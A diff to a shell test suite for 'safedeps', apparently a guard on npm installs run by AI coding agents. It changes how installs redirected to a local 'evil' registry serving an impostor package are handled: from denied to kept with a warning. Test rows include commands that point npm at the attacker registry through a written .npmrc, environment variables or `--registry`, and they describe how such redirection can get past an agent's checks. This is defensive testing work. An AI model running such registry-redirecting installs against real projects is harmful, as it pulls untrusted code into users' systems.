@@ -536,24 +536,26 @@ ROWS
 #     before it: nothing on Claude Code, the install's own scripts on Codex.
 #   OM1: `omit-lockfile-registry-resolved` records no source, so nothing shows
 #     the package came from the public registry. Not rebuilt; a boundary.
-#   RH1-RH7: a record on registry.npmjs.org is not where the bytes came from.
+#   RH1-RH8: a record on registry.npmjs.org is not where the bytes came from.
 #     npm's default `replace-registry-host=npmjs` fetches such a URL from the
 #     configured registry and records it unchanged, so a second registry here
 #     ("evil", 127.0.0.1, its own port and request log) serves EVIL-sd-approved
 #     as sd-approved@1.0.0 and every record still reads as the public
-#     registry. Where npm says, before the command, that it fetches from
-#     there (a committed .npmrc in RH1 and the clone RH2, the command's own
-#     environment in RH3 and RH3e), the pre-guard denies the install, as it
-#     denies `--registry` (RH4). Where only the post hook's own ask after the
-#     command sees it (an .npmrc the command wrote), a new project's install is
-#     rolled back (RH1w) and a clone's committed records are installed and not
-#     rebuilt (RH2w). Where an earlier statement can change npm's environment
-#     unseen (`source`), nobody can say, and the rebuild is skipped (RH7).
-#     RH8 installs from a workspace member with the registry in the root's
-#     .npmrc, where npm will not answer `npm config` in the member itself.
-#     RH5 is the control: the sandbox registry, named by
-#     SAFEDEPS_NPM_TEST_REGISTRY, is rebuilt as before. The rebuild used to run
-#     EVIL for RH1-RH3.
+#     registry. A registry configured this way is also how a company registry,
+#     a mirror or a proxy looks, and safedeps has no path yet to approve one,
+#     so the install is neither denied nor rolled back: it is kept, nothing is
+#     rebuilt, and the warning names the registry and says to ask the user
+#     before rebuilding. That holds wherever npm says so: a committed .npmrc
+#     (RH1, the clone RH2), the command's own environment (RH3, RH3e), an
+#     .npmrc the command wrote, seen by the post hook's own ask (RH1w, RH2w),
+#     and a workspace member under the root's .npmrc, where npm will not
+#     answer `npm config` in the member itself (RH8). On Codex the install is
+#     not inert, so its own scripts ran, and the warning says so (RH3x). Where
+#     an earlier statement can change npm's environment unseen (`source`),
+#     nobody can say, and the rebuild is skipped (RH7). A `--registry` the
+#     command spells out stays denied (RH4). RH5 is the control: the sandbox
+#     registry, named by SAFEDEPS_NPM_TEST_REGISTRY, is rebuilt as before. The
+#     rebuild used to run EVIL for RH1-RH3.
 #
 # Marks a script must never leave: sd-victim, the EVIL tarball and directories,
 # and LIB directories, which stand for a committed directory dependency.
@@ -839,17 +841,17 @@ NB2i|nested_rootbundle|claude|kept:a package not recorded as coming from the pub
 NB2n|nested_rootbundle|claude|kept:a package not recorded as coming from the public registry (${NESTED_KEY} (sd-swapped@1.0.0 from |npm install --no-save sd-approved@1.0.0
 NB3|bundled_sourced|claude|kept:a package not recorded as coming from the public registry (node_modules/sd-bundler/node_modules/sd-bundled (sd-bundled@1.0.0 from |npm ci
 OM1|omit|claude|kept:a package not recorded as coming from the public registry (node_modules/sd-approved (sd-approved@1.0.0 from no recorded source))|npm install sd-approved@1.0.0
-RH1|evilrc|claude|denied:non-standard npm registry: npm reads registry=${EVIL_REG} for this install|npm install sd-approved@1.0.0
-RH2|evilclone|claude|denied:non-standard npm registry: npm reads registry=${EVIL_REG} for this install|npm ci
-RH3|project|claude|denied:non-standard npm registry: npm reads registry=${EVIL_REG} for this install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
-RH3e|project|claude|denied:non-standard npm registry: npm reads registry=${EVIL_REG} for this install|export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0
-RH3x|project|codex|denied:non-standard npm registry: npm reads registry=${EVIL_REG} for this install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
+RH1|evilrc|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm install sd-approved@1.0.0
+RH2|evilclone|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm ci
+RH3|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
+RH3e|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0
+RH3x|project|codex|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not make the install inert (on Codex it cannot), so unless the command said --ignore-scripts, their install scripts already ran during the install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
 RH4|project|claude|denied:Command uses non-standard npm registry|npm install --registry ${EVIL_REG} sd-approved@1.0.0
 RH5|project|claude|quiet:sd-approved|npm install sd-approved@1.0.0
-RH1w|project|claude|fallback:${NPMJS_APPROVED_URL}, but npm fetches it from the registry ${EVIL_REG}|printf 'registry=${EVIL_REG}\n' > .npmrc && npm install sd-approved@1.0.0
-RH2w|evilclone_bare|claude|kept:a package recorded on the public registry that safedeps cannot tell npm fetched from there (node_modules/sd-approved (sd-approved@1.0.0 recorded at ${NPMJS_APPROVED_URL}, but npm fetches it from the registry ${EVIL_REG}|printf 'registry=${EVIL_REG}\n' > .npmrc && npm ci
-RH8|evilws|claude|denied:non-standard npm registry: npm reads registry=${EVIL_REG} for this install|npm install sd-approved@1.0.0
-RH7|evilenvfile|claude|kept:but an earlier statement (source) can change the environment npm runs with|source ./npmenv.sh; npm install sd-approved@1.0.0
+RH1w|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|printf 'registry=${EVIL_REG}\n' > .npmrc && npm install sd-approved@1.0.0
+RH2w|evilclone_bare|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|printf 'registry=${EVIL_REG}\n' > .npmrc && npm ci
+RH8|evilws|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm install sd-approved@1.0.0
+RH7|evilenvfile|claude|kept:could not tell which registry this install fetched sd-approved from (an earlier statement (source) can change the environment npm runs with|source ./npmenv.sh; npm install sd-approved@1.0.0
 ROWS
 [[ ${#FAILURES[@]} -ne ${failures_before} ]] \
   || pass "install scripts run only over a tree on record from the public registry or a workspace, a package counts as bundled only where its parent's package.json bundles it, a record on the public registry counts only where npm says it fetched from there, a rollback runs none without a confirmed snapshot and says what ran on each engine, and K4-K7 are installed but not rebuilt"
@@ -1083,8 +1085,8 @@ done
 pass "the trace check starts no npm: none on a row with no trace, config, query and rebuild only on a row with one"
 
 npm_sandbox_registry_was_local
-# The evil registry is asked for the impostor only, and was asked at all: RH1w
-# and RH2w fetch through it.
+# The evil registry is asked for the impostor only, and was asked at all: every
+# RH row but RH4 and RH5 fetches through it.
 [[ -s "${EVILREG_DIR}/registry.log" ]] || fail "the RH rows went through the evil registry"
 if grep -vE '^GET /sd-approved(/-/sd-approved-1\.0\.0\.tgz)?$' "${EVILREG_DIR}/registry.log" | grep -q .; then
   fail "the evil registry saw only sd-approved ($(sort -u "${EVILREG_DIR}/registry.log" | paste -sd, -))"
